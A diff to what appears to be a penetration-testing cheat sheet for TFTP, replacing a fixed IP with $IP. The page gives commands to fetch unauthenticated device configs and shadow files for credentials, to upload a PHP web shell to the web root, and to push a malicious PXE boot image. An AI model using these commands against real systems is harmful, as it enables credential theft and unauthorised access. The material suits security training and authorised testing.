@@ -1,14 +1,14 @@
 # TFTP (69)
 
 !!! tip "Start here"
-    TFTP has no authentication, fetch common config files immediately: `atftp --get --remote-file running-config --local-file running-config 10.10.10.10`. Network device configs often contain SNMP community strings, local credentials, and VPN pre-shared keys.
+    TFTP has no authentication, fetch common config files immediately: `atftp --get --remote-file running-config --local-file running-config $IP`. Network device configs often contain SNMP community strings, local credentials, and VPN pre-shared keys.
 
 ---
 
 ## Enumeration
 
 ```bash
-nmap -sU -p 69 --script tftp-enum 10.10.10.10
+nmap -sU -p 69 --script tftp-enum $IP
 ```
 
 ---
@@ -16,8 +16,8 @@ nmap -sU -p 69 --script tftp-enum 10.10.10.10
 ## Fetching Files
 
 ```bash
-atftp --get --remote-file running-config --local-file running-config 10.10.10.10
-atftp --get --remote-file startup-config --local-file startup-config 10.10.10.10
+atftp --get --remote-file running-config --local-file running-config $IP
+atftp --get --remote-file startup-config --local-file startup-config $IP
 ```
 
 Common files to try:
@@ -38,7 +38,7 @@ shadow
 If the server allows writes, upload to a web-accessible path for a shell:
 
 ```bash
-atftp --put --local-file shell.php --remote-file /var/www/html/shell.php 10.10.10.10
+atftp --put --local-file shell.php --remote-file /var/www/html/shell.php $IP
 ```
 
 ---
@@ -48,7 +48,7 @@ atftp --put --local-file shell.php --remote-file /var/www/html/shell.php 10.10.1
 If the TFTP server is used for PXE booting, download boot files and check if they're writable:
 
 ```bash
-tftp 10.10.10.10
+tftp $IP
 tftp> get pxelinux.0
 tftp> get boot.cfg
 tftp> put malicious_pxeboot.efi
